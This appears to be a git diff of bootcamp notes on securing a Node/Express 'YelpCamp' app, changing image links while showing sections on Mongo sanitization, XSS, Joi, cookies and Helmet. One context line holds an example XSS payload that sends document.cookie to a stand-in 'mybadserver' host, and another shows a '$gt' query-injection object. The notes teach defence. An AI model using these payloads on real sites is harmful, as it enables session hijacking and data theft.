@@ -62,7 +62,7 @@ app.use((req, res, next) => {
 
 Right now, no sanitization is taking place. If we make our own request with a dollar sign, this will show up in our console:
 
-![img1](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img1.jpg?raw=true)
+![img1](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img1.jpg?raw=true)
 
 ```
 { '$gt': 'rgkmergmgre' }
@@ -85,9 +85,9 @@ app.use(mongoSanitize({
 }));
 ```
 
-![img2](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img2.jpg?raw=true)
+![img2](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img2.jpg?raw=true)
 
-![img3](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img3.jpg?raw=true)
+![img3](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img3.jpg?raw=true)
 
 ## 2. Cross-Site Scripting (XSS)
 
@@ -99,21 +99,21 @@ There's is this one game called _XSS Game_ that introduces the idea of XSS.
 
 On the first level, the website wants us to enter a query in the search bar
 
-![img4](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img4.jpg?raw=true)
+![img4](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img4.jpg?raw=true)
 
-![img5](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img5.jpg?raw=true)
+![img5](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img5.jpg?raw=true)
 
 The website displays the query directly in the document, and that's important because we can add our own tags
 
-![img6](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img6.jpg?raw=true)
+![img6](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img6.jpg?raw=true)
 
-![img7](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img7.jpg?raw=true)
+![img7](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img7.jpg?raw=true)
 
 The website is directly taking our query and embedding it into the HTML document
 
-![img8](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img8.jpg?raw=true)
+![img8](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img8.jpg?raw=true)
 
-![img9](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img9.jpg?raw=true)
+![img9](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img9.jpg?raw=true)
 
 One thing that you can access through JS are cookies. A lot of people with have their cookies under `document.cookies`. If you can inject a script like the one below, you can take that information from a single user and send it to somewhere else. On the script below, it's saying that we are making a new image element. Whenever we set the `src` of an image, your browser is sending a request.
 
@@ -135,9 +135,9 @@ yourwebsite.com?name<script>new Image().src='mybadserver/hacker?output='+documen
 
 Let's go back to a camp and see what happens if we try to inject a script or even an HTML element to start. When we edit our campground's name to have an `<h1>` tag, we will see this:
 
-![img10](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img10.jpg?raw=true)
+![img10](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img10.jpg?raw=true)
 
-![img11](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img11.jpg?raw=true)
+![img11](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img11.jpg?raw=true)
 
 This is not treated as HTML, and the reason for this is that in EJS, when we use the `<%= %>` syntax, this will escape HTML.
 
@@ -153,7 +153,7 @@ When we view the page source, we see that entity codes are used
 
 But there is a problem: we are still vulnerable to this issue. There is one place where our elements are treated as HTML, and that is in our campground's marker on the map
 
-![img12](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img12.jpg?raw=true)
+![img12](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img12.jpg?raw=true)
 
 ### 3.2 Using JOI to Have Safeguards
 
@@ -274,13 +274,13 @@ module.exports.campgroundSchema = Joi.object({
 
 So now let's see what happens when we use HTML tags on our reviews or campgrounds
 
-![img13](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img13.jpg?raw=true)
+![img13](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img13.jpg?raw=true)
 
-![img14](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img14.jpg?raw=true)
+![img14](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img14.jpg?raw=true)
 
-![img15](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img15.jpg?raw=true)
+![img15](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img15.jpg?raw=true)
 
-![img16](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img16.jpg?raw=true)
+![img16](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img16.jpg?raw=true)
 
 ## 4. Minor Changes to Sessions / Cookies
 
@@ -310,7 +310,7 @@ const sessionConfig = {
 
 Remember that you can verify that our cookie is HttpOnly by going into the dev tools and looking at our cookies
 
-![img17](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img17.jpg?raw=true)
+![img17](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img17.jpg?raw=true)
 
 If we were to add `secure: true` inside of the cookie, then it will break things. It says that this cookie should only work over HTTPS. Local host is not HTTPS. If we were to log in, then we wouldn't be signed into an account
 
@@ -347,7 +347,7 @@ const sessionConfig = {
 }
 ```
 
-![img18](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img18.jpg?raw=true)
+![img18](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img18.jpg?raw=true)
 
 *Note that the website is still storing our previous cookie*
 
@@ -357,7 +357,7 @@ The reason why we would want to change the name is that `connect.id` is the defa
 
 Another thing to be aware of when you are deploying or creating an application for production is that you don't want to give users any errors or dev stack traces
 
-![img19](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img19.jpg?raw=true)
+![img19](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img19.jpg?raw=true)
 
 The title of the error is fine, but below it is not because it doesn't make sense to a user. One option, inside `error.ejs` is to hide it with EJS conditionals 
 
@@ -386,7 +386,7 @@ require('dotenv').config();
 
 Now when we log back in and create an error, it should not show the stack trace
 
-![img20](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img20.jpg?raw=true)
+![img20](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img20.jpg?raw=true)
 
 ## 6. Using Helmet
 
@@ -413,7 +413,7 @@ app.use(helmet.contentSecurityPolicy());
 
 ... will not be happy with some of our application. If we load our app up, we get these things
 
-![img21](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img21.jpg?raw=true)
+![img21](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img21.jpg?raw=true)
 
 We will cover why this happens in the next video. For now, let's edit our middleware to disable `contentSecurityPolicy`
 
@@ -428,11 +428,11 @@ app.use(
 
 Let's show a quick example of what Helmet does. When we send a GET request, we get these in our headers
 
-![img22](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img22.jpg?raw=true)
+![img22](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img22.jpg?raw=true)
 
 Some of these came from Helmet. This is what we get if we disabled it 
 
-![img23](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img23.jpg?raw=true)
+![img23](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img23.jpg?raw=true)
 
 The headers that our included with Helmet are in the docs, which explain what they are. These headers just make our app more secure
 
@@ -468,7 +468,7 @@ upgrade-insecure-requests
 
 If we send a GET request in our app, this is what the browser will see. Then the browser decides what sources to load resources from.
 
-![img24](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/58-YelpCamp-Security/58-YelpCamp-Security/img-for-notes/img24.jpg?raw=true)
+![img24](https://github.com/Brian-E-Nguyen/Web-Dev-Bootcamp-2020/blob/main/58-YelpCamp-Security/img-for-notes/img24.jpg?raw=true)
 
 Below is an example of how we can set our own content policy
 
